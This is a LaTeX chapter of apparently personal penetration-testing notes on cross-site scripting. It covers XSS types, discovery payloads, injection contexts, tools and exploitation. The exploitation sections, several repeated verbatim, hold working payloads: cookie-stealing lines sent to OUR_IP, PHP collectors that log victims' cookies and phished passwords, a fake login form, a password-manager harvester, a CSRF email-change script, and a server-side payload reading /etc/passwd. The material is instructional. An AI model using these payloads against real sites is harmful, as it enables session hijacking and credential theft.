\chapter{XSS: Cross-Site Scripting}




\section{Introduction}
XSS vulnerabilities take advantage of a flaw in user input sanitization to
"write" JavaScript code to the page and execute it on the client side, leading
to several types of attacks.

XSS vulnerabilities are solely executed on the client-side and hence do not
directly affect the back-end server.

They can only affect the user executing the vulnerability. The direct impact of
XSS vulnerabilities on the back-end server may be relatively low, but they are
very commonly found in web applications, so this equates to a medium risk 

A basic example of an XSS attack is having the target user unwillingly send
their session cookie to the attacker's web server.

As XSS attacks execute JavaScript code within the browser, they are limited to
the browser's JS engine (i.e., V8 in Chrome). They cannot execute system-wide
JavaScript code to do something like system-level code execution. In modern
browsers, they are also limited to the same domain of the vulnerable website. 

In addition to this, if a skilled researcher identifies a binary vulnerability
in a web browser (e.g., a Heap overflow in Chrome), they can utilize an XSS
vulnerability to execute a JavaScript exploit on the target's browser, which
eventually breaks out of the browser's sandbox and executes code on the user's
machine.

\subsection{XSS types}

There are three main types of XSS vulnerabilities:
\begin{itemize}
    \item {\bf Stored (Persistent) XSS}: ithe most critical type of XSS, which
        occurs when user input is stored on the back-end database and then
        displayed upon retrieval (e.g., posts or comments)
    \item {\bf Reflected (Non-Persistent) XSS} occurs when user input is
        displayed on the page after being processed by the backend server, but
        without being stored (e.g., search result or error message)
    \item {\bf DOM-based XSS} another Non-Persistent XSS type that occurs when
        user input is directly shown in the browser and is completely processed
        on the client-side, without reaching the back-end server (e.g., through
        client-side HTTP parameters or anchor tags)
\end{itemize}


\subsection{Basic discovery payload}

\begin{verbatim}
<script>alert(window.origin)</script>
\end{verbatim}

Tip: Many modern web applications utilize cross-domain IFrames to handle user
input, so that even if the web form is vulnerable to XSS, it would not be a
vulnerability on the main web application. This is why we are showing the value
of window.origin in the alert box, instead of a static value like 1. In this
case, the alert box would reveal the URL it is being executed on, and will
confirm which form is the vulnerable one, in case an IFrame was being used.

As some modern browsers may block the \verb+alert()+ JavaScript function in
specific locations, it may be handy to know a few other basic XSS payloads to
verify the existence of XSS. One such XSS payload is \verb+<plaintext>+, which
will stop rendering the HTML code that comes after it and display it as
plaintext.  Another easy-to-spot payload is \verb+<script>print()</script>+
that will pop up the browser print dialog, which is unlikely to be blocked by
any browsers.

Another usefull one is the \verb+console.log+ or simply \verb+debuger+
\begin{verbatim}
<script>debugger;</script>
\end{verbatim}

\begin{small}
\begin{verbatim}
<script>console.log("Test XSS\n".concat(document.domain).concat("\n").concat(window.origin))</script>
\end{verbatim}
\end{small}

\section{XSS types}

\subsection{Stored XSS}


\subsection{Reflected XSS}
The simplest variety of XSS. It arises when an application receives data in an
HTTP request and includes that data within the immediate response in an unsafe
way. 

 If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:
\begin{itemize}
    \item Perform any action within the application that the user can perform.
    \item View any information that the user is able to view.
    \item Modify any information that the user is able to modify.
    \item Initiate interactions with other application users, including
        malicious attacks, that will appear to originate from the initial
        victim user.
\end{itemize}



\subsection{DOM  XSS}
To further understand the nature of the DOM-based XSS vulnerability, we must
understand the concept of the {\bf Source} and {\bf Sink} of the object displayed on the page.

The Source is the JavaScript object that takes the user input, and it can be
any input parameter like a URL parameter or an input field.

The Sink is the function that writes the user input to a DOM Object on the
page. If the Sink function does not properly sanitize the user input, it would
be vulnerable to an XSS attack. Some of the commonly used JavaScript functions
to write to DOM objects are: \verb+document.write()+, \verb+DOM.innerHTML+,
\verb+DOM.outerHTML+

Furthermore, some of the jQuery library functions that write to DOM objects
are: \verb+add()+, \verb+after()+, \verb+append()+

If a Sink function writes the exact input without any sanitization (like the
above functions), and no other means of sanitization were used, then we know
that the page should be vulnerable to XSS.

example of vulnerable code:
\begin{verbatim}
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
...
document.getElementById("todo").innerHTML = " " + decodeURIComponent(task);
\end{verbatim}

\verb+innerHTML+ function does not allow the use of the <script> tags within it
as a security feature. Still, there are many other XSS payloads usable such as: 
\begin{verbatim}
<img src="" onerror=alert(window.origin)>
\end{verbatim}

The above line creates a new HTML image object, which has a onerror attribute
that can execute JavaScript code when the image is not found. So, as we
provided an empty image link ("")




\section{XSS contexts}

When testing for reflected and stored XSS, a key task is to identify the XSS context:
\begin{itemize}
    \item The location within the response where attacker-controllable data
        appears.
    \item Any input validation or other processing that is being performed on
        that data by the application.
\end{itemize}

Based on these details, you can then select one or more candidate XSS payloads,
and test whether they are effective.

\subsection{XSS between HTML tags}
 When the XSS context is text between HTML tags, you need to introduce some new
 HTML tags designed to trigger execution of JavaScript.

Some useful ways of executing JavaScript are:
\begin{verbatim}
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
\end{verbatim}

\subsection{XSS in HTML tag attributes}
 When the XSS context is into an HTML tag attribute value, you might sometimes
 be able to terminate the attribute value, close the tag, and introduce a new
 one. For example:
\begin{verbatim}
"><script>alert(document.domain)</script>
\end{verbatim}

More commonly in this situation, angle brackets are blocked or encoded, so your
input cannot break out of the tag in which it appears. Provided you can
terminate the attribute value, you can normally introduce a new attribute that
creates a scriptable context, such as an event handler. For example:
\begin{verbatim}
" autofocus onfocus=alert(document.domain) x="
\end{verbatim}

The above payload creates an onfocus event that will execute JavaScript when
the element receives the focus, and also adds the autofocus attribute to try to
trigger the onfocus event automatically without any user interaction. Finally,
it adds \verb+x="+ to gracefully repair the following markup. 

 Sometimes the XSS context is into a type of HTML tag attribute that itself can
 create a scriptable context. Here, you can execute JavaScript without needing
 to terminate the attribute value. For example, if the XSS context is into the
 \verb+href+ attribute of an anchor tag, you can use the \verb+javascript+
 pseudo-protocol to execute script. For example:
\begin{verbatim}
<a href="javascript:alert(document.domain)">
\end{verbatim}

You might encounter websites that encode angle brackets but still allow you to
inject attributes. Sometimes, these injections are possible even within tags
that don't usually fire events automatically, such as a canonical tag. You can
exploit this behavior using access keys and user interaction on Chrome. Access
keys allow you to provide keyboard shortcuts that reference a specific element.
The \verb+accesskey+ attribute allows you to define a letter that, when pressed in combination with other keys (these vary across different platforms), will cause events to fire. 



\subsection{XSS into JavaScript}
\subsubsection{Terminating the existing script}
\subsubsection{Breaking out of a JavaScript string}
\subsubsection{Making use of HTML-encoding}
\subsubsection{XSS in JavaScript template literals}

\subsection{XSS via client-side template injection}


\section{XSS discovery}
\subsection{Automated discovery}
Almost all Web Application Vulnerability Scanners (like Nessus, Burp Pro, or
ZAP) have various capabilities for detecting all three types of XSS
vulnerabilities. These scanners usually do two types of scanning:
\begin{itemize}
    \item A Passive Scan, which reviews client-side code for potential DOM-based vulnerabilities,
    \item An Active Scan, which sends various types of payloads to attempt to
        trigger an XSS through payload injection in the page source.
\end{itemize}

open-source tools can assist us in identifying potential XSS vulnerabilities.
Such tools usually work by identifying input fields in web pages, sending
various types of XSS payloads, and then comparing the rendered page source to
see if the same payload can be found in it, which may indicate a successful XSS
injection. Still, this will not always be accurate, as sometimes, even if the
same payload was injected, it might not lead to a successful execution due to
various reasons, so we must always manually verify the XSS injection.

Some of the common open-source tools that can assist us in XSS discovery are:
\begin{itemize}
    \item \href{https://github.com/s0md3v/XSStrike}{XSS Strike}
    \item \href{https://github.com/rajeshmajumdar/BruteXSS}{Brute XSS}
    \item \href{https://github.com/epsylon/xsser}{XSSer} 
    \item
        \href{https://portswigger.net/burp/documentation/desktop/tools/dom-invader}{DOM
        Invader}
\end{itemize}



\subsection{Manual discovery}

\subsubsection{Reflected XSS}
 Testing for reflected XSS vulnerabilities manually involves the following steps:

\begin{itemize}
    \item {\bf Test every entry point}. Test separately every entry point for
        data within the application's HTTP requests. This includes parameters
        or other data within the URL query string and message body, and the URL
        file path.  It also includes HTTP headers, although XSS-like behavior
        that can only be triggered via certain HTTP headers may not be
        exploitable in practice.
    \item {\bf Submit random alphanumeric values}. For each entry point, submit
        a unique random value and determine whether the value is reflected in
        the response. The value should be designed to survive most input
        validation, so needs to be fairly short and contain only alphanumeric
        characters. But it needs to be long enough to make accidental matches
        within the response highly unlikely. 
    \item {\bf Determine the reflection context}. For each location within the
        response where the random value is reflected, determine its context.
        This might be in text between HTML tags, within a tag attribute which
        might be quoted, within a JavaScript string, etc.
    \item {\bf Test a candidate payload}. Based on the context of the
        reflection, test an initial candidate XSS payload that will trigger
        JavaScript execution if it is reflected unmodified within the response.
        
    \item {\bf Test alternative payloads}. If the candidate XSS payload was
        modified by the application, or blocked altogether, then you will need
        to test alternative payloads and techniques that might deliver a
        working XSS attack based on the context of the reflection and the type
        of input validation that is being performed. 
\end{itemize}

\subsubsection{Stored XSS}
 Testing for stored XSS vulnerabilities manually can be challenging. You need
 to test all relevant "entry points" via which attacker-controllable data can
 enter the application's processing, and all "exit points" at which that data
 might appear in the application's responses.

Entry points into the application's processing include:
\begin{itemize}
    \item Parameters or other data within the URL query string and message body.
    \item The URL file path.
    \item HTTP request headers that might not be exploitable in relation to reflected XSS.
    \item Any out-of-band routes via which an attacker can deliver data into
        the application. The routes that exist depend entirely on the
        functionality implemented by the application: a webmail application
        will process data received in emails; an application displaying a
        Twitter feed might process data contained in third-party tweets; and a
        news aggregator will include data originating on other web sites.
\end{itemize}

The exit points for stored XSS attacks are all possible HTTP responses that are
returned to any kind of application user in any situation.

The first step in testing for stored XSS vulnerabilities is to locate the links
between entry and exit points, whereby data submitted to an entry point is
emitted from an exit point. The reasons why this can be challenging are that:
\begin{itemize}
    \item Data submitted to any entry point could in principle be emitted from
        any exit point. For example, user-supplied display names could appear
        within an obscure audit log that is only visible to some application
        users.
    \item Data that is currently stored by the application is often vulnerable
        to being overwritten due to other actions performed within the
        application. For example, a search function might display a list of
        recent searches, which are quickly replaced as users perform other
        searches.
\end{itemize}

To comprehensively identify links between entry and exit points would involve
testing each permutation separately, submitting a specific value into the entry
point, navigating directly to the exit point, and determining whether the value
appears there. However, this approach is not practical in an application with
more than a few pages.

Instead, a more realistic approach is to work systematically through the data
entry points, submitting a specific value into each one, and monitoring the
application's responses to detect cases where the submitted value appears.
Particular attention can be paid to relevant application functions, such as
comments on blog posts. When the submitted value is observed in a response, you
need to determine whether the data is indeed being stored across different
requests, as opposed to being simply reflected in the immediate response.

When you have identified links between entry and exit points in the
application's processing, each link needs to be specifically tested to detect
if a stored XSS vulnerability is present. This involves determining the context
within the response where the stored data appears and testing suitable
candidate XSS payloads that are applicable to that context. At this point, the
testing methodology is broadly the same as for finding reflected XSS
vulnerabilities.

\subsubsection{DOM-based XSS}

You need to work through each available source in turn, and test each one
individually.

\href{https://portswigger.net/web-security/cross-site-scripting/dom-based}{https://portswigger.net/web-security/cross-site-scripting/dom-based}

\subsubsection{XSS payloads}

\begin{itemize}
    \item \href{https://portswigger.net/web-security/cross-site-scripting/cheat-sheet}{PortSwigger
cheat sheet}
    \item \href{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md}{PayloadAllTheThing}
    \item \href{https://github.com/payloadbox/xss-payload-list}{PayloadBox}
\end{itemize}

The majority of the payloads proposed do not work even though we are dealing
with the most basic type of XSS vulnerabilities. This is because these payloads
are written for a wide variety of injection points (like injecting after a
single quote) or are designed to evade certain security measures (like
sanitization filters). Furthermore, such payloads utilize a variety of
injection vectors to execute JavaScript code, like basic <script> tags, other
HTML Attributes like <img>, or even CSS Style attributes. This is why we can
expect that many of these payloads will not work in all test cases, as they are
designed to work with certain types of injections.

\href{https://github.com/LasCC/Hack-Tools}{Hack-Tools}



\subsubsection{Code review}
The most reliable method of detecting XSS vulnerabilities is manual code
review, which should cover both back-end and front-end code. Understand
precisely how the input is being handled all the way until it reaches the web
browser, allow to write a custom payload that should work with high confidence.

It's unlikely to find any XSS vulnerabilities through payload lists or XSS
tools for the more common web applications. This is because the developers of
such web applications likely run their application through vulnerability
assessment tools and then patch any identified vulnerabilities before release.
For such cases, manual code review may reveal undetected XSS vulnerabilities,
which may survive public releases of common web applications.



\section{Exploiting XSS}

\subsection{Defacing attack}
One of the most common attacks usually used with stored XSS vulnerabilities is
website defacing attacks. 

Although many other vulnerabilities may be utilized to achieve the same thing,
stored XSS vulnerabilities are among the most used vulnerabilities for doing
so.

We can utilize injected JavaScript code (through XSS) to make a web page look
any way we like. However, defacing a website is usually used to send a simple
message (i.e., we successfully hacked you), so giving the defaced web page a
beautiful look isn't really the primary target.

Three HTML elements are usually utilized to change the main look of a web page:
\begin{itemize}
        \item Background Color \verb+document.body.style.background+
        \item Background \verb+document.body.background+
        \item Page \verb+Title document.title+
        \item Page Text \verb+DOM.innerHTML+ that should be {\bf minifyed}
\end{itemize}

We can utilize two or three of these elements to write a basic message to the
web page and even remove the vulnerable element
\verb+document.getElementById().remove()+ such that it would be more difficult
to quickly reset the web page, as we will see next.

To find the id of the HTML element to remove, one can use the {\emph Page
Inspector Picker}

Another solution more violant is to comment all the HTML after the payload 


\subsection{Session hijacking}
Stealing cookies is a traditional way to exploit XSS. Most web applications use
cookies for session handling. You can exploit cross-site scripting
vulnerabilities to send the victim's cookies to your own domain, then manually
inject the cookies into the browser and impersonate the victim.

In practice, this approach has some significant limitations:
\begin{itemize}
   \item  The victim might not be logged in.
   \item  Many applications hide their cookies from JavaScript using the
       \verb+HttpOnly+ flag.
   \item  Sessions might be locked to additional factors like the user's IP
       address.
   \item  The session might time out before you're able to hijack it.
\end{itemize}

There are multiple JavaScript payloads we can use to grab the session cookie
and send it to us, as shown by
\href{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc}{PayloadsAllTheThings}:
\begin{verbatim}
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
\end{verbatim}


runing on our webserver
\begin{verbatim}
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | $key : {$cookie}\n");
        fclose($file);
    }
}
?>
\end{verbatim}


\subsection{Stealing credentials}

\subsubsection{Exploiting password managers}
 These days, many users have password managers that auto-fill their passwords.
 You can take advantage of this by creating a password input, reading out the
 auto-filled password, and sending it to your own domain. This technique avoids
 most of the problems associated with stealing cookies, and can even gain
 access to every other account where the victim has reused the same password.

The primary disadvantage of this technique is that it only works on users who
have a password manager that performs password auto-fill. (Of course, if a user
doesn't have a password saved you can still attempt to obtain their password
through an on-site phishing attack, but it's not quite the same.) 

\begin{verbatim}
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('URL',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
\end{verbatim}

\subsubsection{On-site phishing attack}
A common form of XSS phishing attacks is through injecting fake login forms
that send the login details to the attacker's server, which may then be used to
log in on behalf of the victim and gain control over their account and
sensitive information.

One common vector can be a form of image viewers (type an image url to be
displayed).

The attack will consist of creating a payload that will deface the webpage and
insert a login form. The form action will send the data to a webserver owned by
the attacker.

example of payload:
\begin{verbatim}
<script>document.write('
    <h3>Please login to continue</h3>
    <form action=http://OUR_IP/index.php>
        <input type="username" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <input type="submit" name="submit" value="Login">
    </form>');
    document.getElementById('urlform').remove();
\end{verbatim}

For the attacker server a simple nc will work but for persistance a php server
with the following code can be started:
\begin{verbatim}
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
\end{verbatim}


\subsection{Performing CSRF}
Anything a legitimate user can do on a web site, you can probably do too with
XSS. Depending on the site you're targeting, you might be able to make a victim
send a message, accept a friend request, commit a backdoor to a source code
repository, or transfer some Bitcoin.

Some websites allow logged-in users to change their email address without
re-entering their password. If you've found an XSS vulnerability, you can make
it trigger this functionality to change the victim's email address to one that
you control, and then trigger a password reset to gain access to the account.

This type of exploit is typically referred to as cross-site request forgery
(CSRF), which is slightly confusing because CSRF can also occur as a standalone
vulnerability. When CSRF occurs as a standalone vulnerability, it can be
patched using strategies like anti-CSRF tokens. However, these strategies do
not provide any protection if an XSS vulnerability is also present. 
\begin{verbatim}
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
\end{verbatim}


\section{Defacing attack}
One of the most common attacks usually used with stored XSS vulnerabilities is
website defacing attacks. Defacing a website means changing its look for anyone
who visits the website. It is very common for hacker groups to deface a website
to claim that they had successfully hacked it. Such attacks can carry great
media echo and may significantly affect a company's investments and share
prices, especially for banks and technology firms.

Although many other vulnerabilities may be utilized to achieve the same thing,
stored XSS vulnerabilities are among the most used vulnerabilities for doing
so.

We can utilize injected JavaScript code (through XSS) to make a web page look
any way we like. However, defacing a website is usually used to send a simple
message (i.e., we successfully hacked you), so giving the defaced web page a
beautiful look isn't really the primary target.

Three HTML elements are usually utilized to change the main look of a web page:
\begin{itemize}
        \item Background Color \verb+document.body.style.background+
        \item Background \verb+document.body.background+
        \item Page \verb+Title document.title+
        \item Page Text \verb+DOM.innerHTML+ that should be {\bf minifyed}
\end{itemize}

We can utilize two or three of these elements to write a basic message to the
web page and even remove the vulnerable element
\verb+document.getElementById().remove()+ such that it would be more difficult
to quickly reset the web page, as we will see next.

To find the id of the HTML element to remove, one can use the {\emph Page
Inspector Picker}

Another solution more violant is to comment all the HTML after the payload 

\section{Phishing attack}
Phishing attacks usually utilize legitimate-looking information to trick the
victims into sending their sensitive information to the attacker. A common form
of XSS phishing attacks is through injecting fake login forms that send the
login details to the attacker's server, which may then be used to log in on
behalf of the victim and gain control over their account and sensitive
information.

One common vector can be a form of image viewers (type an image url to be
displayed).

The attack will consist of creating a payload that will deface the webpage and
insert a login form. The form action will send the data to a webserver owned by
the attacker.

example of payload:
\begin{verbatim}
<script>document.write('
    <h3>Please login to continue</h3>
    <form action=http://OUR_IP/index.php>
        <input type="username" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <input type="submit" name="submit" value="Login">
    </form>');
    document.getElementById('urlform').remove();
\end{verbatim}

For the attacker server a simple nc will work but for persistance a php server
with the following code can be started:
\begin{verbatim}
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
\end{verbatim}


\section{Session hijacking attack}
There are multiple JavaScript payloads we can use to grab the session cookie
and send it to us, as shown by
\href{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc}{PayloadsAllTheThings}:
\begin{verbatim}
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
\end{verbatim}


runing on our webserver
\begin{verbatim}
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | $key : {$cookie}\n");
        fclose($file);
    }
}
?>
\end{verbatim}


\section{Server Side XSS}

in cas a server is building a pdf an a field is reflected in the pdf it might
be vulnerable. See
\href{https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90}{this}
and
\href{https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f}{this
articles}

To test:
\begin{verbatim}
<script>document.write('PWNED')</script>
\end{verbatim}

real paylod:
\begin{verbatim}
<iframe src=”http://hacker.com"></iframe>

<p id=”test”>aa</p><script>document.getElementById(‘test’).innerHTML+=’aa’</script>


<p id=”test”>aa</p><script>document.getElementById(‘test’).innerHTML+=window.location</script>

<script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///etc/passwd");
	x.send();
</script>
\end{verbatim}



\section{links}
